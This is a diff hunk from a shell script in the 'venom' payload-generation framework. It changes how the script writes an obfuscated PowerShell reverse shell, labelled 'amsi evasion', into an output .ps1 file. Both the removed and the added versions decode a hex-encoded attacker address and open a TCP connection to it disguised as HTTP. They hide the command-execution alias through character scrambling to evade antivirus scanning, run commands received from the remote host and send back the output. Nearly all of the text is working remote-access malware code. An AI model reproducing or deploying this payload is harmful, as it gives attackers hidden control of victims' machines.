@@ -13105,28 +13105,7 @@ echo "Framework: venom v1.0.17 (amsi evasion)" >> $IPATH/output/$NaM.ps1
 echo "Original shell: Paranoid Ninja" >> $IPATH/output/$NaM.ps1
 echo "#>" >> $IPATH/output/$NaM.ps1
 echo "" >> $IPATH/output/$NaM.ps1
-echo "while (\$true) {" >> $IPATH/output/$NaM.ps1
-echo "   \$pxhex = $hexed;" >> $IPATH/output/$NaM.ps1
-echo "   \$pass = (\$pxhex | ForEach { [convert]::ToInt32(\$_,16) }) -join '.';" >> $IPATH/output/$NaM.ps1
-echo "   \$wua = \"GET /index.html HTTP/1.1\`r\`nHost: \$pass\`r\`nMozilla/5.0 (Windows NT 10.0; WOW64; rv:56.0) Gecko/20100101 Firefox/56.0\`r\`nAccept: text/html\`r\`n\`r\`n\";" >> $IPATH/output/$NaM.ps1
-echo "   \$slui = [System.Text.ASCIIEncoding];[byte[]]\$b = 0..65535|%{0};" >> $IPATH/output/$NaM.ps1
-echo "   \$xuxa = \"n-eiorvsxpk5\";" >> $IPATH/output/$NaM.ps1
-echo "   Set-alias \$xuxa (\$xuxa[\$true-10] + (\$xuxa[[byte](\"0x\" + \"FF\") - 265]) + \$xuxa[[byte](\"0x\" + \"9a\") - 158]);" >> $IPATH/output/$NaM.ps1
-echo "   \$yat = New-Object System.Net.Sockets.TCPClient(\$pass,$lport);" >> $IPATH/output/$NaM.ps1
-echo "   \$zzz = \$yat.GetStream();" >> $IPATH/output/$NaM.ps1
-echo "   \$data = \$slui::UTF8.GetBytes(\$wua);" >> $IPATH/output/$NaM.ps1
-echo "   \$zzz.Write(\$data, 0, \$data.Length);" >> $IPATH/output/$NaM.ps1
-echo "   \$trash = (n-eiorvsxpk5 whoami) + \"> \";" >> $IPATH/output/$NaM.ps1
-echo "" >> $IPATH/output/$NaM.ps1
-echo "Start-Sleep -Milliseconds 300" >> $IPATH/output/$NaM.ps1
-echo "while((\$l = \$z.Read(\$b, 0, \$b.Length)) -ne 0){;" >> $IPATH/output/$NaM.ps1
-echo "   \$value = (New-Object -TypeName \$slui).GetString(\$b,0, \$l);" >> $IPATH/output/$NaM.ps1
-echo "   \$data = \$slui::UTF8.GetBytes((n-eiorvsxpk5 \$value 2>&1 | Out-String )) + \$slui::UTF8.GetBytes(\$trash);" >> $IPATH/output/$NaM.ps1
-echo "   \$zzz.Write(\$data, 0, \$data.Length);" >> $IPATH/output/$NaM.ps1
-echo "}" >> $IPATH/output/$NaM.ps1
-echo "\$yat.Close();" >> $IPATH/output/$NaM.ps1
-echo "Start-Sleep -Milliseconds 200" >> $IPATH/output/$NaM.ps1
-echo "}" >> $IPATH/output/$NaM.ps1
+echo "while (\$true) {\$px = $hexed;\$p = (\$px | ForEach { [convert]::ToInt32(\$_,16) }) -join '.';\$w = \"GET /index.html HTTP/1.1\`r\`nHost: \$p\`r\`nMozilla/5.0 (Windows NT 10.0; WOW64; rv:56.0) Gecko/20100101 Firefox/56.0\`r\`nAccept: text/html\`r\`n\`r\`n\";\$s = [System.Text.ASCIIEncoding];[byte[]]\$b = 0..65535|%{0};\$x = \"n-eiorvsxpk5\";Set-alias \$x (\$x[\$true-10] + (\$x[[byte](\"0x\" + \"FF\") - 265]) + \$x[[byte](\"0x\" + \"9a\") - 158]);\$y = New-Object System.Net.Sockets.TCPClient(\$p,$lport);\$z = \$y.GetStream();\$d = \$s::UTF8.GetBytes(\$w);\$z.Write(\$d, 0, \$d.Length);\$t = (n-eiorvsxpk5 whoami) + \"> \";while((\$l = \$z.Read(\$b, 0, \$b.Length)) -ne 0){;\$v = (New-Object -TypeName \$s).GetString(\$b,0, \$l);\$d = \$s::UTF8.GetBytes((n-eiorvsxpk5 \$v 2>&1 | Out-String )) + \$s::UTF8.GetBytes(\$t);\$z.Write(\$d, 0, \$d.Length);}\$y.Close();Start-Sleep -Seconds 3}" >> $IPATH/output/$NaM.ps1
 
 
 ## Building the Download Webpage Sellected.
